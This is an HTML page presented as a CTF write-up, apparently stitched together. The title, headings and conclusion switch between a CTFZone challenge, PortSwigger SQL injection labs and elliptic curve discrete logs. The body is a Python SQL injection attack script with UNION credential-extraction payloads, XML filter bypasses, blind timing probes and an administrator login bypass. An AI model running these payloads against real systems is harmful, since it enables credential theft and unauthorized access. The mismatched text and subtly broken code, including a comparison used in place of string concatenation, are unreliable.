 <title>ctfzone2024---Shes the Real one  Writeup </title>
 

<!DOCTYPE html>
<html>
 
<body>
    <h1>portswigger---SQL injection Writeup </h1>

    <h2>Challenge Description</h2>
    <p>  this is  python code and works about solutions for https://portswigger.net/
sqli lab
</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol> 
        <li>this is a  elliptic curve discrete that should get p ,q,e with reverse saga 
and solve it with bruteforce or other method
get p , q e by urself
<pre>
import requests
import time
from bs4 import BeautifulSoup
def solve(url):
    message=bypass_sqli_with_xml(url)
    message+="\n"+detect_sqli(url)
    message+="\n"+detect_blind_sqli(url)
    message+="\n"+run_sqli_attack(url)
    message=="\n"+login_as_admin(url)
    return message
def bypass_sqli_with_xml(url):
    """Attempt to bypass SQL injection filters via XML encoding"""
    headers = {"Content-Type": "application/xml"}
    xml_payloads = [
        "<storeId>1+1</storeId>",
        "<storeId>1 UNION SELECT NULL</storeId>",
        "<storeId>1 UNION SELECT username, password FROM users</storeId>"
    ]
    
    for payload in xml_payloads:
        try:
            response = requests.post(url, data=f"<root>{payload}</root>", headers=headers, timeout=5)
            if "admin" in response.text.lower():
                return f"[+] SQL Injection successful with payload: {payload}\nExtracted Data: {response.text[:500]}"
        except requests.RequestException:
            continue
    return "[-] No SQL Injection detected via XML encoding."
def detect_sqli(url):
    """Check if the URL is vulnerable to basic SQL Injection"""
    test_payloads = [
        "'",                   # Syntax error test
        "' OR '1'='1' --",     # Always-true test
        '" OR "1"="1" --',     # Double-quote version
        "' AND 1=2 --",        # Always-false test
        "' UNION SELECT null --",  # UNION-based test
    ]
    
    for payload in test_payloads:
        try:
            full_url = f"{url}{payload}"
            response = requests.get(full_url, timeout=5)
            
            # Check for SQL error messages
            sql_errors = ["SQL syntax", "mysql_fetch", "ODBC", "SQLite", "PostgreSQL"]
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    return True, f"Vulnerable! Detected SQL error with payload: {payload}"

            # Boolean-based test (1=1 vs. 1=2)
            if "' OR '1'='1' --" in payload and response.status_code == 200:
                false_url = f"{url}' AND '1'='2' --"
                false_response = requests.get(false_url, timeout=5)
                if response.text != false_response.text:
                    return True, "Vulnerable! Boolean-based SQL Injection detected."
        
        except requests.RequestException:
            continue  # Ignore timeouts

    return False, "No immediate SQLi detected, further testing needed."

def detect_blind_sqli(url):
    """Detect Blind SQL Injection using time delay"""
    blind_payload = "'; WAITFOR DELAY '0:0:5' --"
    try:
        start_time = time.time()
        requests.get(f"{url}{blind_payload}", timeout=10)
        elapsed_time = time.time() - start_time

        if elapsed_time > 4:  # If response delay is detected
            return True, "Potential Blind SQL Injection detected (Delayed response observed)."
    except requests.Timeout:
        return True, "Blind SQL Injection detected (Timeout-based delay observed)."
    except requests.RequestException:
        pass  # Ignore network errors

    return False, "No Blind SQL Injection detected."

def run_sqli_attack(url):
    """Perform a full SQL injection attack if detected"""
    payload = "' OR 1=1 --"
    attack_url = f"{url}{payload}"

    try:
        response = requests.get(attack_url, timeout=5)
        return response.text[:1000]  # Limit output for safety
    except Exception as e:
        return f"Error: {str(e)}"


def login_as_admin(url,path="login"):
    """Attempt to log in as administrator using SQL Injection"""
    login_url = f"{url}/{path}"
    data = {
        "username": "administrator' --",
        "password": "anyPassword"
    }
    try:
        response = requests.post(login_url, data=data, timeout=5)
        if "Your username is: administrator" in response.text:
            return "[+] Successfully logged in as administrator!"
        else:
            return "[-] Admin login failed."
    except Exception as e:
        return f"Error: {str(e)}"


</pre>
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">CTFZone{m4yb3_5h35_4_c0mpl3x_0n3}
</p>

    <h2>Conclusion</h2>
    <p>this is a medium chanllenge for work on  elliptic curve discrete</p>

</body>
</html>
